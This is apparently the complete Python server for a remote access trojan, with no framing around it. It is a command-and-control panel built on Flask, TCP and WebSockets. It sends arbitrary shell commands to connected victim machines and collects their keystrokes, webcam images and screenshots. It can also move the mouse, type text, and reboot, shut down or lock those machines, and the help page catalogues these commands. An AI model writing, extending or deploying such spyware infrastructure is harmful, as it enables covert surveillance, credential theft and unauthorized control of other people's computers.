
import socket
import threading
import asyncio
import websockets
import base64
import logging
import time
import os
from datetime import datetime
import json
from flask import Flask, render_template, request, send_file, redirect, url_for, send_from_directory
from flask_cors import CORS

# --- Flask App Initialization ---
app = Flask(__name__)
CORS(app)

# --- Configuration ---
HOST = "0.0.0.0"
TCP_PORT = 5555
WS_CLIENT_PORT = 8765
WS_BROWSER_PORT = 8766
FLASK_PORT = 5000
MAX_FRAME_SIZE = 2 * 1024 * 1024
FRAME_RATE_LIMIT = 1.0 / 6.67  # Match client FPS
FRAME_BUFFER = []
BUFFER_SIZE = 3

clients = []
cmd_output = ""
keylogs = ""
latest_frame = None
frame_lock = threading.Lock()
cmd_lock = threading.Lock()
key_lock = threading.Lock()
browser_ws_clients = set()

# Metadata file for images
IMAGE_METADATA_FILE = os.path.join(os.path.dirname(__file__), "images", "metadata.json")

def save_image_metadata(filename, device, timestamp):
    os.makedirs(os.path.dirname(IMAGE_METADATA_FILE), exist_ok=True)
    try:
        if os.path.exists(IMAGE_METADATA_FILE):
            with open(IMAGE_METADATA_FILE, "r") as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []
    data.append({
        "filename": filename,
        "device": device,
        "time": timestamp
    })
    with open(IMAGE_METADATA_FILE, "w") as f:
        json.dump(data, f)

# --- TCP Server Setup ---
tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind((HOST, TCP_PORT))
tcp_server.listen()

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


app = Flask(__name__)
CORS(app)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/display")
def display():
    return render_template("display.html")

@app.route("/keylogger")
def keylogger():
    with key_lock:
        logs = keylogs if keylogs else "No keylogs yet."
    return render_template("keylogger.html", logs=logs)

@app.route("/command", methods=["GET", "POST"])
def command():
    global cmd_output
    if request.method == "POST":
        cmd = request.form.get("cmd")
        if cmd:
            for client in clients:
                try:
                    client.send(f"CMD:{cmd}".encode())
                except Exception as e:
                    logging.error(f"Send CMD failed: {e}")
            return redirect(url_for("command"))
    with cmd_lock:
        output = cmd_output
    return render_template("command.html", output=output)

@app.route("/webcam", methods=["GET", "POST"])
def webcam():
    global clients
    if request.method == "POST":
        # Send webcam capture command to all clients
        for client in clients:
            try:
                client.send(b"CMD:WEBCAM")
            except Exception as e:
                logging.error(f"Send WEBCAM CMD failed: {e}")
        time.sleep(0.5)
    with frame_lock:
        frame = latest_frame
    if frame:
        # Clean up the base64 string
        if isinstance(frame, bytes):
            frame = frame.decode(errors="ignore")
        frame_clean = frame.replace('\n', '').replace('\r', '').strip()
        try:
            img_data = base64.b64decode(frame_clean + '=' * (-len(frame_clean) % 4))
        except Exception as e:
            logging.error(f"Base64 decode error: {e}")
            return render_template("webcam.html", image_data=None)
        img_dir = os.path.join(os.path.dirname(__file__), "images")
        os.makedirs(img_dir, exist_ok=True)
        device = "Unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"webcam_{timestamp}.jpg"
        img_path = os.path.join(img_dir, filename)
        with open(img_path, "wb") as f:
            f.write(img_data)
        save_image_metadata(filename, device, timestamp)
        return render_template("webcam.html", image_data=frame_clean)
    return render_template("webcam.html", image_data=None)

# --- Screenshot Capture Page ---
@app.route("/screenshot_capture", methods=["GET", "POST"])
def screenshot_capture():
    image_url = None
    timestamp = None
    device = None
    if request.method == "POST":
        # Send screenshot command to all clients
        for client in clients:
            try:
                client.send(b"CMD:SCREENSHOT")
            except Exception as e:
                logging.error(f"Send SCREENSHOT CMD failed: {e}")
        # Wait for client to send screenshot (should be handled in handle_client)
        time.sleep(0.5)
        # Find the latest screenshot in images folder
        img_dir = os.path.join(os.path.dirname(__file__), "images")
        screenshots = [f for f in os.listdir(img_dir) if f.startswith("screenshot_") and f.endswith(".jpg")]
        if screenshots:
            latest = max(screenshots, key=lambda x: os.path.getctime(os.path.join(img_dir, x)))
            image_url = url_for("serve_image", filename=latest)
            timestamp = latest.replace("screenshot_", "").replace(".jpg", "")
            device = "Unknown"
    return render_template("screenshot_capture.html", image_url=image_url, timestamp=timestamp, device=device)

# --- Webcam Capture Page ---
@app.route("/webcam_capture", methods=["GET", "POST"])
def webcam_capture():
    image_url = None
    timestamp = None
    device = None
    if request.method == "POST":
        # Send webcam command to all clients
        for client in clients:
            try:
                client.send(b"CMD:WEBCAM")
            except Exception as e:
                logging.error(f"Send WEBCAM CMD failed: {e}")
        time.sleep(0.5)
        # Find the latest webcam image in images folder
        img_dir = os.path.join(os.path.dirname(__file__), "images")
        webcams = [f for f in os.listdir(img_dir) if f.startswith("webcam_") and f.endswith(".jpg")]
        if webcams:
            latest = max(webcams, key=lambda x: os.path.getctime(os.path.join(img_dir, x)))
            image_url = url_for("serve_image", filename=latest)
            timestamp = latest.replace("webcam_", "").replace(".jpg", "")
            device = "Unknown"
    return render_template("webcam_capture.html", image_url=image_url, timestamp=timestamp, device=device)

@app.route("/download_webcam")
def download_webcam():
    with frame_lock:
        if latest_frame:
            img_data = base64.b64decode(latest_frame)
            img_dir = os.path.join(os.path.dirname(__file__), "images")
            os.makedirs(img_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            img_path = os.path.join(img_dir, f"webcam_{timestamp}.jpg")
            with open(img_path, "wb") as f:
                f.write(img_data)
            return send_file(img_path, as_attachment=True)
    return ("", 204)
# Serve images statically
from flask import send_from_directory

@app.route("/images/<filename>")
def serve_image(filename):
    img_dir = os.path.join(os.path.dirname(__file__), "images")
    return send_from_directory(img_dir, filename)

# Images gallery page
@app.route("/images_gallery")
def images_gallery():
    images = []
    if os.path.exists(IMAGE_METADATA_FILE):
        with open(IMAGE_METADATA_FILE, "r") as f:
            images = json.load(f)
    return render_template("images.html", images=images)

@app.route("/control", methods=["GET", "POST"])
def control():
    if request.method == "POST":
        action = request.form.get("action")
        value = request.form.get("value")
        if action == "mouse":
            x, y = value.split(",")
            msg = f"CMD:MOUSE_MOVE:{x}:{y}"
        elif action == "type":
            msg = f"CMD:TYPE:{value}"
        elif action == "remove_persistence":
            msg = "CMD:REMOVE_PERSISTENCE"
        elif action == "reboot":
            msg = "CMD:REBOOT"
        elif action == "shutdown":
            msg = "CMD:SHUTDOWN"
        elif action == "lock":
            msg = "CMD:LOCK"
        else:
            msg = ""
        if msg:
            for client in clients:
                try:
                    client.send(msg.encode())
                except Exception as e:
                    logging.error(f"Control command failed: {e}")
        return redirect(url_for("control"))
    return render_template("control.html")

@app.route("/latest_frame")
def latest_image():
    with frame_lock:
        if latest_frame:
            return base64.b64decode(latest_frame)
        return ("", 204)

@app.route("/help")
def help_page():
    commands = [
        {"command": "CMD:<shell command>", "description": "Execute a shell command"},
        {"command": "CMD:MOUSE_MOVE:x:y", "description": "Move mouse to coordinates (x, y)"},
        {"command": "CMD:TYPE:<text>", "description": "Type given text remotely"},
        {"command": "CMD:REMOVE_PERSISTENCE", "description": "Remove persistence from client"},
        {"command": "CMD:REBOOT", "description": "Reboot the client machine"},
        {"command": "CMD:SHUTDOWN", "description": "Shutdown the client machine"},
        {"command": "CMD:LOCK", "description": "Lock the client machine screen"},
    ]
    return render_template("help.html", commands=commands)

# --- TCP Client Handler ---
def handle_client(client_socket):
    global cmd_output, keylogs
    while True:
        try:
            data = client_socket.recv(8192)
            if not data:
                break
            if data.startswith(b"KEY:"):
                with key_lock:
                    keylogs += data[4:].decode(errors='ignore') + "\n"
            elif data.startswith(b"CMD:") or data.startswith(b"CMD ERROR:"):
                with cmd_lock:
                    cmd_output = data.decode(errors='ignore')
            elif data.startswith(b"WEBCAM:"):
                img_data = data[len("WEBCAM:"):].decode()
                with frame_lock:
                    global latest_frame
                    latest_frame = img_data.encode()
            if data.startswith(b"SCREENSHOT:"):
                img_data = data[len("SCREENSHOT:"):].decode()
                # Save screenshot to images folder
                img_dir = os.path.join(os.path.dirname(__file__), "images")
                os.makedirs(img_dir, exist_ok=True)
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = f"screenshot_{timestamp}.jpg"
                img_path = os.path.join(img_dir, filename)
                try:
                    img_bytes = base64.b64decode(img_data + '=' * (-len(img_data) % 4))
                    with open(img_path, "wb") as f:
                        f.write(img_bytes)
                    save_image_metadata(filename, "Unknown", timestamp)
                except Exception as e:
                    logging.error(f"Failed to save screenshot: {e}")
            else:
                logging.info(f"Received: {data[:50]}")
        except Exception as e:
            logging.error(f"TCP client error: {e}")
            break
    client_socket.close()
    if client_socket in clients:
        clients.remove(client_socket)

# --- Accept Clients Thread ---
def accept_clients():
    while True:
        client_socket, addr = tcp_server.accept()
        logging.info(f"Client connected: {addr}")
        clients.append(client_socket)
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

# --- Handle WebSocket Streaming from Client ---
async def handle_client_ws(websocket):
    global latest_frame
    last_send_time = 0
    try:
        async for frame_data in websocket:
            current_time = time.time()
            if len(frame_data) > MAX_FRAME_SIZE:
                logging.warning("Received oversized frame, skipping")
                continue

            if current_time - last_send_time < FRAME_RATE_LIMIT:
                await asyncio.sleep(FRAME_RATE_LIMIT - (current_time - last_send_time))
                continue
            last_send_time = current_time

            with frame_lock:
                latest_frame = frame_data.encode()
                FRAME_BUFFER.append(latest_frame)
                if len(FRAME_BUFFER) > BUFFER_SIZE:
                    FRAME_BUFFER.pop(0)

            disconnected_clients = set()
            for ws_client in browser_ws_clients:
                try:
                    await ws_client.send(frame_data)
                    logging.debug(f"Forwarded frame of size {len(frame_data)} bytes")
                except Exception as e:
                    logging.warning(f"Browser WS send error: {e}")
                    disconnected_clients.add(ws_client)
            
            browser_ws_clients.difference_update(disconnected_clients)
    except Exception as e:
        logging.error(f"WebSocket client error: {e}")

# --- Handle WebSocket to Browser ---
async def handle_browser_ws(websocket):
    browser_ws_clients.add(websocket)
    try:
        with frame_lock:
            for frame in FRAME_BUFFER:
                try:
                    await websocket.send(frame.decode())
                except:
                    pass
        await websocket.wait_closed()
    finally:
        browser_ws_clients.remove(websocket)

# --- Main Entry ---
async def main():
    threading.Thread(target=accept_clients, daemon=True).start()
    threading.Thread(target=lambda: app.run(host=HOST, port=FLASK_PORT, debug=False), daemon=True).start()

    await asyncio.gather(
        websockets.serve(handle_client_ws, HOST, WS_CLIENT_PORT),
        websockets.serve(handle_browser_ws, HOST, WS_BROWSER_PORT),
        asyncio.Future(),
    )

if __name__ == "__main__":
    asyncio.run(main())